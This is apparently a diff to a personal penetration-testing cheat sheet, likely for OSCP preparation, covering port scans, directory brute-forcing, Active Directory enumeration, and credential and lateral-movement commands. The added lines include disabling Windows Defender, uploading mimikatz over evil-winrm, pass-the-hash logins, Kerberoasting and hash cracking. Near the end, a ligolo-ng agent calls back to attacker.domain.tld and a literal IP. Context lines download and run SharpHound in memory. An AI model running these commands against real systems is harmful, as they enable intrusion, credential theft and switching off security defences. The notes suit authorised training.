@@ -16,6 +16,7 @@ Your content here
 
 ## Port/OS Discovery
 ```
+nmap -Pn -p- host.domain.tld -v -T3
 sudo masscan -p1-65535,U:1-65535 --rate=500 -e tun0 #.#.#.#
 ```
 1. Paste results into Sublime and enable regex
@@ -58,12 +59,14 @@ Remove `asp`/`aspx` for Linux hosts
 - https://epi052.github.io/feroxbuster-docs/docs/configuration/command-line/
 - `-f` can cause a ton of false positives
 - `-n` stops recursive directory lookups
+- `-b` searches for backups; can produce false positives
 ```
-feroxbuster -u http://host.domain.tld:80/ -f -n -C 404 -A -e -S 0 --thorough --burp-replay --dont-scan Css Js css img js IMG JS Img CSS fonts Fonts master
-feroxbuster -u http://host.domain.tld:80/ -x asp,aspx,html,php,xml,json,txt -C 404 -A -e -S 0 --thorough --burp-replay
-feroxbuster -u http://host.domain.tld/cgi-bin:80/ -x cgi,pl,py,sh -C 404 -A -e -S 0 --thorough --burp-replay
-feroxbuster -u http://host.domain.tld:80/ -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' --thorough --burp-replay
-feroxbuster -u http://host.domain.tld:80/ -x html,php -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' --thorough --burp-replay
+feroxbuster -u http://host.domain.tld:80/ -f -n -C 404 -A -e -S 0 -B --auto-tune --burp-replay
+feroxbuster -u http://host.domain.tld:80/ -f -n -C 404 -A -e -S 0 -B --auto-tune --burp-replay --dont-scan Css Js css img js IMG JS Img CSS fonts Fonts master
+feroxbuster -u http://host.domain.tld:80/ -x asp,aspx,html,php,xml,json,txt -C 404 -A -e -S 0 -B --auto-tune --burp-replay
+feroxbuster -u http://host.domain.tld/cgi-bin:80/ -x cgi,pl,py,sh -C 404 -A -e -S 0 -B --auto-tune --burp-replay
+feroxbuster -u http://host.domain.tld:80/ -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' -B --auto-tune --burp-replay
+feroxbuster -u http://host.domain.tld:80/ -x html,php -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' -B --auto-tune --burp-replay
 ```
 **Inner-URL**
 
@@ -161,6 +164,8 @@ Your content here
 - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 - https://pentestmonkey.net/tools/audit/unix-privesc-check
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+- https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt
+- https://gtfobins.github.io/
 ```
 sudo -l
 getcap -r / 2>/dev/null
@@ -190,15 +195,18 @@ Your content here
 - https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a
 - https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
 - https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md
+- **PowerView requires all capital LDAP distinguished names**
 ### Anonymous
 Your content here
 #### DNS
+- `-tcp` if needed
 ```
 dnsrecon -n #.#.#.# -d domain.tld -a -x './dnsrecon.xml' -c './dnsrecon.csv'
 ```
 #### LDAP(S)
 - https://github.com/CroweCybersecurity/ad-ldap-enum
-- https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
+- Can still pull partial info if ^ fails: https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
 - https://github.com/garrettfoster13/pre2k-TS
 - LDAP insensitive terms (`grep -i 'pattern' 'File.txt'`): password, pwd, secret
 ```
@@ -208,13 +216,14 @@ ldapsearch -h host.domain.tld -x -b "DC=domain,DC=tld" > './ldapsearch_anon.txt'
 ldapsearch -h host.domain.tld -x -b "DC=domain,DC=tld" '(objectClass=person)' > './ldapsearch_anon_person.txt'
 cat './ldapsearch_anon.txt' \ awk '{print #1}' | sort | uniq -c | sort -n
 cat './ldapsearch_anon.txt' \ awk '{print #1}' | sort | uniq -c | sort -n | grep ':'
+python "$Tools/LdapRelayScan/LdapRelayScan.py" -dc-ip #.#.#.# -method LDAPS
 ```
 #### RPC
 - https://github.com/cddmp/enum4linux-ng
 - https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
 - https://github.com/p0dalirius/Coercer
 ```
-python "$Tools/enum4linux-ng/enum4linux-ng.py" -C host.domain.tld -A -R -Gm -oA '<full-path>/enum4linux-ng_Anon'
+python "$Tools/enum4linux-ng/enum4linux-ng.py" -C host.domain.tld -A -R -Gm -oA "$OSCP/##/enum4linux-ng_Anon"
 grep 'username\:.*' 'enum4linux-ng_Anon.yaml' | cut -d : -f 2 > 'Domain_Users.txt'
 ```
 ```
@@ -242,6 +251,7 @@ smbclient '//host.domain.tld/Share' -U '' -N
 smbclient '//host.domain.tld/Share' -U 'User' -N
 smbclient '//host.domain.tld/Share' -U 'Guest' -N
 "$Tools/shareenum/src/shareenum" host.domain.tld -o './shareenum_Anon.csv'
+"$Tools/shareenum/src/shareenum" "$OSCP/IPs.txt" -o './shareenum_Anon.csv'
 impacket-Get-GPPPassword domain.tld/@host.domain.tld
 ```
 smbclient, pull all files in share:
@@ -286,25 +296,33 @@ python "$Tools/Shellshock-CVE-2014-6271/shellshock.py" #.#.#.# #### 'http://host
 Your content here
 #### SMB
 - [LnkBomb](https://github.com/dievus/lnkbomb)
+- [MAN-SPIDER](https://github.com/blacklanternsecurity/MANSPIDER)
 ```
 "$Tools/shareenum/src/shareenum" host.domain.tld -u 'Domain\User' -p 'Password123!' -o './shareenum_Auth.csv'
+"$Tools/shareenum/src/shareenum" "$OSCP/IPs.txt" -u 'Domain\User' -p 'Password123!' -o './shareenum_Auth.csv'
 smbclient -L ////host.domain.tld -U 'User' --password 'Password123!'
 smbclient '//host.domain.tld/Share' -U 'User' --password 'Password123!'
 smbmap -H host.domain.tld -u 'User' -p 'Password123!' -d domain.tld -R
 crackmapexec smb host.domain.tld -u 'User' -p 'Password123!' -d domain.tld --shares
 impacket-Get-GPPPassword domain.tld/'User':'Password123!'@host.domain.tld
-sudo mount -t cifs -o 'username=User,password=Password123!' '//host.domain.tld/share' '/mnt/share'
+sudo mount -t cifs -o 'username=User,password=Password123!,domain=domain.tld' '//host.domain.tld/share' '/mnt/share'
+virtualenv > python -m manspider '/mnt/share' -u 'Joe' -p 'Password123!' -d domain.tld -c password
 ```
 #### LDAP(S)
 - https://github.com/CroweCybersecurity/ad-ldap-enum
 - https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
 ```
 python "$Tools/ad-ldap-enum/ad-ldap-enum.py" -l host.domain.tld -d domain.tld -u 'User' -p 'Password123!' -o 'ad-ldap-enum_Auth_'
+python "$Tools/LdapRelayScan/LdapRelayScan.py" -u 'User' -p 'Password123!' -dc-ip #.#.#.# -method BOTH
 ```
 #### Kerberos
 ```
-impacket-GetNPUsers domain.tld/'User':'Password123!' -outputfile 'Impacket_ASREPRoast_Auth.txt'
-impacket-GetUserSPNs domain.tld/'User':'Password123!' -dc-ip host.domain.tld -outputfile 'Impacket_Kerberoast.txt' -Request
+impacket-GetNPUsers domain.tld/'User':'Password123!' -outputfile 'Impacket_ASREPRoast_Auth.txt' -dc-ip host.domain.tld
+impacket-GetUserSPNs domain.tld/'User':'Password123!' -dc-ip host.domain.tld -outputfile 'Impacket_Kerberoast.txt' -Request -dc-ip host.domain.tld
+```
+#### HTTP
+```
+webclientservicescanner domain.tld/'User':'Password123!'@"$OSCP/IPs-Window.txt" -dc-ip host.domain.tld
 ```
 #### Microsoft SQL
 - DBeaver: Fix theme colors: Window > Preferences> General > Appearance > Theme
@@ -313,6 +331,7 @@ impacket-GetUserSPNs domain.tld/'User':'Password123!' -dc-ip host.domain.tld -ou
 patator mssql_login host=host.domain.tld user='User' password='Password123!' windows_auth=0 --max-retries=0 --csv='mssql_single.csv'
 impacket-mssqlclient 'User':'Password123!'@host.domain.tld
 python "$Tools/msdat/msdat.py" all -s host.domain.tld -U 'User' -P 'Password123!'
+& "C:\Program Files\Microsoft SQL Server/Client SDK/ODBC/170/Tools/Binn/SQLCMD.EXE" -S HOST\SQLEXPRESS -U 'sa' -P 'Password123!' -q "select DB_NAME()"
 ```
 #### PSRemoting / WinRM
 ```
@@ -325,17 +344,22 @@ Invoke-Command -Computername host.domain.tld -ScriptBlock { Get-ChildItem '$env:
 ```
 evil-winrm -u 'User' -p 'Password123!' -i host.domain.tld
 evil-winrm -u 'User' -H '31d6cfe0d16ae931b73c59d7e0c089c0' -i host.domain.tld
-upload /full/path/file.exe
-download file.exe
+upload "$Tools/ligolo/ligolo-ng_agent_0.4.3_Windows_64bit.zip"
+upload "$Tools/mimikatz_x64/mimikatz.exe"
+upload "$Tools/winPEAS.exe"
+download 'file.exe'
 gci -hidden ./
 ```
 ```
+impacket-psexec domain.tld/'User'@host.domain.tld -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
 impacket-wmiexec domain.tld/'User':'Password123!'@host.domain.tld
 ```
 #### Lay-of-the-Land
 ```
 whoami /all
 Get-MpComputerStatus
+Set-MpPreference -DisableRealtimeMonitoring $true
+wmic os get osarchitecture
 ```
 #### Certificate Services
 - https://github.com/zer1t0/certi
@@ -361,6 +385,8 @@ Rubeus.exe asktgt /user:'User' /certificate:'.\Cert.pfx' /getcredentials
 - https://github.com/AlmondOffSec/PassTheCert
 
 #### BloodHound
+- https://github.com/hausec/Bloodhound-Custom-Queries
+- `~/.config/bloodhound/<queries-file>`
 ```
 iex(New-Object Net.WebClient).downloadString('http://#.#.#.#/SharpHound.ps1')
 Invoke-BloodHound -CollectionMethod All
@@ -372,8 +398,10 @@ python -m bloodhound -c All -d domain.tld -u 'User' -p 'Password123! -ns #.#.#.#
 - Look for odd stuff (the path) (mark as high-value)
 - Domain Users <> Domain Computers and to each other
 ```
+sudo apt install neo4j=5.2.0+really4.4.16-0kali1 # Neo4j v5.X has bad performance issues
+https://bloodhound.readthedocs.io/en/latest/installation/linux.html
 sudo neo4j console
-bloodhound --no-sandbox
+"$Tools/BloodHound-linux-x64/BloodHound" --no-sandbox
 ```
 #### DACL Exploitation
 Your content here
@@ -404,6 +432,8 @@ hydra -l 'User' -P rockyou-50.txt host.domain.tld http-post-form "/site/login.ph
 ```
 ### SMB
 - `grep -v 'FAILURE' 'smb_user_pass.csv'`
+- `find ./ -name ssh 2>/dev/null`
+- `grep -E -o ".{0,5}password.{0,5}" -iR ./ 2>/dev/null`
 ```
 patator smb_login host=host.domain.tld user='User' password='Password123!' domain=domain.tld port=445 --max-retries=0 --csv='patator_smb_single.csv'
 ```
@@ -438,9 +468,25 @@ sudo hydra -l 'User' -P '/usr/share/wordlists/rockyou.txt' -s 22 ssh://host.doma
 ```
 onesixtyone host.domain.tld -c '/usr/share/wordlists/metasploit/snmp_default_pass.txt'
 ```
+### OpenVPN
+```
+crowbar -b openvpn -s host.domain.tld -p 1194 -u 'User' -m server.conf -C '/usr/share/john/password.lst'
+```
 ## Data Concealment
 NameThatHash (nth)
-
+- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
+**LM**
+```
+hashcat -m 3000 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_LM.txt'
+```
+**NTLM**
+```
+hashcat -m 1000 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_NTLM.txt'
+```
+**DCC2**
+```
+hashcat -m 2100 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_DCC2.txt'
+```
 **NetNTLMv2**
 ```
 hashcat -m 5600 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_NTLMv2.txt'
@@ -475,8 +521,9 @@ echo 'acd==' | base64 -d
 ```
 **File Metadata/String**
 ```
-file file.txt
-exiftool file.txt
+file file.exe
+exiftool file.exe
+strings file.exe | less
 ```
 ## Malware/Exploits
 - Word > Insert > Quick Parts > Field > Links and References > Include picture > http://#.#.#.#/canary.jpg
@@ -510,6 +557,10 @@ exec $SHELL
 pyenv versions
 # Never use sudo
 pyenv virtualenv-delete pyenv-venv-tool
+```
+**Install pyproject.toml**
+```
+pip install -e .
 ```
 **Change Python Versions**
 - https://github.com/pyenv/pyenv
@@ -567,4 +618,29 @@ xfreerdp /u:'domain.tld\User' /p:'Password123!' /v:host.domain.tld:3389
 **SCP**
 ```
 scp 'local-file.txt' User@host.domain.tld:'/home/user'
+```
+**Dynamic Port Forwarding**
+https://github.com/nicocha30/ligolo-ng
+```
+$ sudo ip tuntap add user kali mode tun ligolo
+$ sudo ip link set ligolo up
+$ ip address show
+$ wget 'https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz'
+$ tar -xvf './ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz'
+$ screen -R ligolo
+$ "$Tools/ligolo/proxy" -selfcert
+>> session
+>> # enter to select the session
+>> ifconfig # to find the inaccessible network
+$ sudo ip route add #.#.#.#/## dev ligolo
+>> start
+$ sudo ip link delete ligolo
+```
+```
+$ evil-winrm -i host.domain.tld -u 'User' -H '31d6cfe0d16ae931b73c59d7e0c089c0'
+PS: Set-MpPreference -DisableRealtimeMonitoring $true
+$ upload '<Full-Path>/ligolo/ligolo-ng_agent_0.4.3_Windows_64bit.zip'
+PS: cd "ligolo-ng_agent_0.4.3_Windows_64bit"
+PS: "./agent.exe" -connect attacker.domain.tld:11601 -ignore-cert
+Fails: Start-Job -ScriptBlock {& "ligolo-ng_agent_0.4.3_Windows_64bit/agent.exe" -connect 192.168.45.242:11601 -ignore-cert }
 ```
